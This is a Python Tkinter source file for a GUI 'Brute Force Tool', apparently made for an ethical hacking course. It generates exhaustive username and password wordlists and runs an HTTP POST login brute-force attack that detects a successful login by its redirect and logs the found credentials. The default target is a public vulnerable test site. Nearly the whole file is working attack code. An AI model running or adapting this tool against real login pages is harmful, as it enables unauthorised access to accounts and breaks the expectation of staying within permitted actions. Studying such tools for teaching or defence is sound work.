import requests
import itertools
from tkinter import Tk, Label, Entry, Button, Text, END, filedialog, Frame, DISABLED, NORMAL, messagebox, ttk
import time
import threading

def show_warning():
    """Display a warning message for ethical usage."""
    messagebox.showinfo(
        "Uyarı",
        "Bu uygulama Siber Güvenlik Dersi için Etik Hacking çalışmaları kapsamında kullanılmaktadır."
    )

def generate_passwords(characters, min_length, max_length):
    """Crunch-like password generator and saves the list to a user-specified file"""
    file_path = filedialog.asksaveasfilename(
        title="Save Password List As",
        defaultextension=".txt",
        filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
    )
    if file_path:
        with open(file_path, "w") as file:
            for length in range(min_length, max_length + 1):
                for combo in itertools.product(characters, repeat=length):
                    password = "".join(combo)
                    file.write(password + "\n")
        return file_path

def generate_usernames(characters, min_length, max_length):
    """Crunch-like username generator and saves the list to a user-specified file"""
    file_path = filedialog.asksaveasfilename(
        title="Save Username List As",
        defaultextension=".txt",
        filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
    )
    if file_path:
        with open(file_path, "w") as file:
            for length in range(min_length, max_length + 1):
                for combo in itertools.product(characters, repeat=length):
                    username = "".join(combo)
                    file.write(username + "\n")
        return file_path

def test_url(target_url):
    """Checks the accessibility of the target URL"""
    try:
        response = requests.get(target_url, timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False

def brute_force_attack(target_url, username_file, password_file, output_field, status_label):
    """HTTP POST form brute-force attack"""
    session = requests.Session()
    status_label.config(text="Reading username and password lists, attack started")
    with open(username_file, "r") as usernames, open(password_file, "r") as passwords:
        username_list = [line.strip() for line in usernames]
        password_list = [line.strip() for line in passwords]

        for username in username_list:
            for password in password_list:
                data = {
                    "tfUName": username,
                    "tfUPass": password
                }
                try:
                    response = session.post(target_url, data=data, timeout=2, allow_redirects=False)

                    if "Login failed" in response.text or "invalid" in response.text.lower():
                        output_field.insert(END, f"[-] Tried: USERNAME {username}: PASSWORD {password} - Failed\n")
                    elif response.status_code == 302 and 'Location' in response.headers:
                        redirect_url = response.headers['Location']
                        if "/Default.asp?" in redirect_url:
                            output_field.insert(END, f"[+] Tried: USERNAME {username}: PASSWORD {password} - SUCCESS! \n")
                            with open("attack_results_log.txt", "a") as log_file:
                                log_file.write(f"Successful \n User: {username}, Password: {password}\n")
                            status_label.config(text="Attack completed.")

                            messagebox.showinfo("Successful Login", f"Successful user: {username}\nSuccessful password: {password}")
                            return
                    else:
                        output_field.insert(END, f"[?] Tried: {username}:{password} - Response Could Not Be Analyzed\n")
                except requests.exceptions.RequestException as e:
                    output_field.insert(END, f"[ERROR] For Username: {username}, Password: {password}, Error: {e}\n")
                finally:
                    output_field.see(END)  # Automatically scroll to the bottom
                    time.sleep(0.0)
    status_label.config(text="Attack completed. No combination is correct.")

def select_username_file():
    file_path = filedialog.askopenfilename(
        title="Select Username List File",
        filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
    )
    if file_path:
        username_file_entry.config(state=NORMAL)
        username_file_entry.delete(0, END)
        username_file_entry.insert(0, file_path)
        username_file_entry.config(state=DISABLED)

def select_password_file():
    file_path = filedialog.askopenfilename(
        title="Select Password List File",
        filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
    )
    if file_path:
        password_file_entry.config(state=NORMAL)
        password_file_entry.delete(0, END)
        password_file_entry.insert(0, file_path)
        password_file_entry.config(state=DISABLED)

def generate_list():
    characters = characters_entry.get()
    min_length = int(min_length_entry.get())
    max_length = int(max_length_entry.get())
    file_path = generate_passwords(characters, min_length, max_length)
    if file_path:
        generate_output_field.insert(END, f"[INFO] Password list saved to {file_path} file.\n")
        password_file_entry.config(state=NORMAL)
        password_file_entry.delete(0, END)
        password_file_entry.insert(0, file_path)
        password_file_entry.config(state=DISABLED)

def generate_username_list():
    characters = username_characters_entry.get()
    min_length = int(username_min_length_entry.get())
    max_length = int(username_max_length_entry.get())
    file_path = generate_usernames(characters, min_length, max_length)
    if file_path:
        generate_output_field.insert(END, f"[INFO] Username list saved to {file_path} file.\n")
        username_file_entry.config(state=NORMAL)
        username_file_entry.delete(0, END)
        username_file_entry.insert(0, file_path)
        username_file_entry.config(state=DISABLED)

def start_attack():
    target_url = target_url_entry.get()
    username_file = username_file_entry.get()
    password_file = password_file_entry.get()

    if not test_url(target_url):
        attack_output_field.insert(END, f"[ERROR] Target URL is not accessible: {target_url}\n")
        return

    if username_file and password_file:
        attack_output_field.delete(1.0, END)
        attack_output_field.insert(END, f"[INFO] Reading username and password lists...\n")

        attack_thread = threading.Thread(target=brute_force_attack, args=(
            target_url, username_file, password_file, attack_output_field, status_label
        ))
        attack_thread.start()

# GUI creation
root = Tk()
root.withdraw()  # Temporarily hide the root window

# Show warning message
show_warning()

# Re-show the root window
root.deiconify()
root.title("Brute Force Tool")
root.geometry("1000x700")
root.configure(bg="#1c1c1c")

# Main Frame
main_frame = Frame(root, bg="#1c1c1c", padx=20, pady=20)
main_frame.pack(expand=True, fill="both")

Label(main_frame, text="İSA SARIOĞLAN", font=("Arial", 14, "bold"), bg="#1c1c1c", fg="white").pack(pady=5)

# Left and Right Frames
left_frame = Frame(main_frame, bg="#2c2c2c", padx=10, pady=10)
left_frame.pack(side="left", expand=True, fill="both")

right_frame = Frame(main_frame, bg="#3c3c3c", padx=10, pady=10)
right_frame.pack(side="right", expand=True, fill="both")

# Left Frame Content
Label(left_frame, text="Password and Username Generation", font=("Arial", 16, "bold"), bg="#2c2c2c", fg="white").pack(pady=10)

Label(left_frame, text="Characters:", bg="#2c2c2c", fg="white").pack(anchor="w")
characters_entry = Entry(left_frame, width=30)
characters_entry.pack()

Label(left_frame, text="Minimum Length:", bg="#2c2c2c", fg="white").pack(anchor="w")
min_length_entry = Entry(left_frame, width=30)
min_length_entry.pack()

Label(left_frame, text="Maximum Length:", bg="#2c2c2c", fg="white").pack(anchor="w")
max_length_entry = Entry(left_frame, width=30)
max_length_entry.pack()

Button(left_frame, text="Generate Password List", command=generate_list, bg="#4caf50", fg="white", relief="flat").pack(pady=10)

Label(left_frame, text="Username Characters:", bg="#2c2c2c", fg="white").pack(anchor="w")
username_characters_entry = Entry(left_frame, width=30)
username_characters_entry.pack()

Label(left_frame, text="Minimum Length:", bg="#2c2c2c", fg="white").pack(anchor="w")
username_min_length_entry = Entry(left_frame, width=30)
username_min_length_entry.pack()

Label(left_frame, text="Maximum Length:", bg="#2c2c2c", fg="white").pack(anchor="w")
username_max_length_entry = Entry(left_frame, width=30)
username_max_length_entry.pack()

Button(left_frame, text="Generate Username List", command=generate_username_list, bg="#4caf50", fg="white", relief="flat").pack(pady=10)

# Left Frame Output Field
generate_output_field = Text(left_frame, width=40, height=10, bg="#1e1e1e", fg="white", relief="flat")
generate_output_field.pack(pady=10)

# Right Frame Content
Label(right_frame, text="Brute Force Attack", font=("Arial", 16, "bold"), bg="#3c3c3c", fg="white").pack(pady=10)

Label(right_frame, text="Target URL:", bg="#3c3c3c", fg="white").pack(anchor="w")
target_url_entry = Entry(right_frame, width=50)
target_url_entry.insert(0, "http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F")
target_url_entry.pack()

Label(right_frame, text="Username List File:", bg="#3c3c3c", fg="white").pack(anchor="w")
username_file_entry = Entry(right_frame, width=50, state=DISABLED)
username_file_entry.pack()

Button(right_frame, text="Select Username List", command=select_username_file, bg="#2196f3", fg="white", relief="flat").pack(pady=5)

Label(right_frame, text="Password List File:", bg="#3c3c3c", fg="white").pack(anchor="w")
password_file_entry = Entry(right_frame, width=50, state=DISABLED)
password_file_entry.pack()

Button(right_frame, text="Select Password List", command=select_password_file, bg="#2196f3", fg="white", relief="flat").pack(pady=5)

Button(right_frame, text="Start Attack", command=start_attack, bg="#f44336", fg="white", relief="flat").pack(pady=10)

attack_output_field = Text(right_frame, width=70, height=15, bg="#1e1e1e", fg="white", relief="flat")
attack_output_field.pack(pady=10)

status_label = Label(right_frame, text="Status: Attack Not Started", font=("Arial", 12), bg="#3c3c3c", fg="#4caf50")
status_label.pack(pady=5)

root.mainloop()